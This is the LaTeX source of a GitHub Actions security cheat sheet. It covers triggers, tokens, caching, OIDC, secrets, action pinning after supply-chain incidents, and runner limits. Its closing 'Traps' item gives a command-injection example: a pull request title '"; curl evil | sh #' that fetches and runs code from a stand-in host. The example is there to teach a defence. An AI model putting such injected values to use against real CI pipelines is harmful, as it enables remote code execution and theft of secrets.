\oneliner{An \textbf{event} starts every workflow in \ct{.github/workflows/} whose \ct{on:} matches; its
\textbf{jobs} form a DAG (\ct{needs:}), each on a \textbf{fresh runner}, running \textbf{steps} in one
workspace. Security is \textbf{which code runs with which token, secrets and cache}: the trigger decides,
\ct{permissions:} and \ct{cache-mode:} narrow it, \textbf{OIDC} replaces stored cloud keys, a \textbf{commit
SHA} pins what runs.}

\ct{actions/checkout} \textbf{v7} refuses fork-PR code in \ct{pull\_request\_target} and \ct{workflow\_run}
unless \ct{allow-unsafe-pr-checkout: true}; backported as v6.1.0 / v5.1.0 / v4.4.0 (and v2, v3) — a
\textbf{floating} tag got it, an old \textbf{SHA pin did not}; a plain \ct{git fetch} is never checked.
\textbf{Safe split}: build untrusted code under \ct{pull\_request} (no secrets), do the privileged
comment or upload in \ct{workflow\_run}, reading its artifacts as \emph{data}.

\hd{Cache and artifacts}
\begin{itemize}
  \item \textbf{Cache}: key $\leq$512 chars, entries \textbf{immutable}; exact key, then \ct{restore-keys}
        prefixes (newest match). Readable from the current, default and (PR) base branch; a PR's
        merge-ref cache only by its re-runs. 10 GB/repo by default (admins raise it; over 10 GB
        \$0.07/GB-month); evicted after \textbf{7 days unused} (max 90 public, 365 private).
  \item \ct{cache-mode:} per workflow or job — \ct{read}, \ct{write}, \ct{write-only}, \ct{none};
        a called workflow cannot widen it; \ct{write} on a low-trust event = warning annotation.
  \item \textbf{Artifacts}: kept 90 days (1–90 public, 1–400 private), immutable; \ct{upload-artifact@v7}
        \ct{archive: false} = one unzipped file; \ct{download-artifact@v8} fails on a hash mismatch.
        Current majors: checkout v7, cache v6.
\end{itemize}

\hd{Concurrency, matrix, data between jobs}
\begin{itemize}
  \item \textbf{Concurrency}: per \ct{group} one running + one \emph{pending}; a newer run replaces the
        pending one; \ct{cancel-in-progress: true} kills the running one too (PRs yes, deploys no).
        \ct{queue: max} keeps $\leq$100 pending in order — not with \ct{cancel-in-progress}.
  \item \textbf{Matrix}: cross product, \ct{include} adds keys or combos, \ct{exclude} drops;
        $\leq$\textbf{256 jobs}/run; \ct{fail-fast} (default true) cancels siblings; \ct{max-parallel}.
  \item Job \ct{outputs:} $\leq$1 MB/job, 50 MB/run; step summary $\leq$1 MiB; \ct{if:} defaults to
        \ct{success()}; \ct{timeout-minutes} defaults to 360.
\end{itemize}

\hd{A hardened deploy job}
\begin{lstlisting}[language=YamlSheet]
on: { push: { branches: [main] } }
permissions: { contents: read }        # default, every job
concurrency: { group: deploy-prod, cancel-in-progress: false }
jobs:
  deploy:
    runs-on: ubuntu-24.04
    environment: prod                  # reviewers + env secrets
    permissions: { contents: read, id-token: write }  # OIDC
    cache-mode: none                   # restore nothing
    steps:
      - uses: actions/checkout@<40-hex-sha>  # v7.0.1
      - uses: aws-actions/configure-aws-credentials@<sha>
        with: { role-to-assume: arn:aws:iam::123456789012:role/ci,
                aws-region: eu-west-1 } # no stored AWS key
      - env: { MSG: "${{ github.event.head_commit.message }}" }
        run: ./deploy.sh "$MSG"        # env var, NOT ${{ }} in script
\end{lstlisting}

\hd{GITHUB\_TOKEN}
Per-job GitHub App installation token, dead when the job ends; new personal repos: read
\ct{contents} + \ct{packages}. Naming \emph{any} scope in \ct{permissions:} sets the rest to \ct{none}.
Its events start \textbf{no runs} — except \ct{workflow\_dispatch}, \ct{repository\_dispatch}, and PRs
it opens or pushes to, which wait for approval. 1,000 API req/h/repo.

\hd{OIDC — no long-lived cloud keys}
\ct{id-token: write} lets a step fetch a GitHub-signed JWT; the cloud checks \ct{aud} + \ct{sub} and
returns short-lived creds. \ct{sub} = \ct{repo:O/R:environment:prod},
\ct{…:ref:refs/heads/main} or \ct{…:pull\_request}; repos created, renamed or moved after 15 Jul 2026 get
\ct{repo:O@123/R@456:…}, so a re-registered name no longer matches. Trusting \ct{repo:acme/*} lets every
acme repo assume the role.

\hd{Secrets and environments}
100 per repo and per environment, 1,000 per org, 48 KB each; none for fork PRs. Masked only
\textbf{verbatim}: a JSON blob, base64 or derived value prints in clear — \ct{::add-mask::} it.
Environment: $\leq$6 reviewers, no self-review, wait $\leq$30 days, branch/tag filter; secrets after approval.

\hd{Pinning — a tag is a movable pointer}
A \ct{pull\_request\_target} PR on spotbugs leaked a PAT in Dec 2024\unverified; then
\ct{reviewdog/action-setup@v1} was re-pointed (11 Mar 2025), then \ct{tj-actions/changed-files} (23k+
repos, CVE-2025-30066): its version tags moved to code dumping \ct{Runner.Worker} memory into the log,
public on public repos; SHA pins were untouched.
Pin 40-hex SHAs (+ \ct{\# v4.2.2} for Dependabot / Renovate); org policy can \textbf{require} pins and
\ct{!}block an action even when pinned; immutable releases lock tag + assets; \ct{actions.lock}
(\ct{gh actions-lock}, technical preview) pins transitive actions. SHA pins get \textbf{no} Dependabot alerts.

\hd{Limits and plans}
Free / Pro / Team / Enterprise: concurrent jobs 20 / 40 / 60 / 500, of them macOS 5 / 5 / 5 / 50;
included minutes 2,000 / 3,000 / 3,000 / 50,000. Run $\leq$35 days · 50 re-runs · file $\leq$500 KB ·
25 dispatch inputs · 1,500 events/10 s/repo.

\hd{Self-hosted runners}
Persistent disk, network, credentials: a job can backdoor the next — \textbf{never on public repos};
use JIT/ephemeral runners (one job). Job $\leq$5 days, queue 24 h; auto-update off and 30 days behind a
release = no jobs. The \$0.002/min fee due 1 Mar 2026 was postponed.

\hd{Traps}
\begin{itemize}
  \trap{\ct{run: echo "\$\{\{ github.event.pull\_request.title \}\}"} is pasted into the script
        \emph{before} bash runs: a title \ct{"; curl evil | sh \#} executes. Pass it via \ct{env:}.}
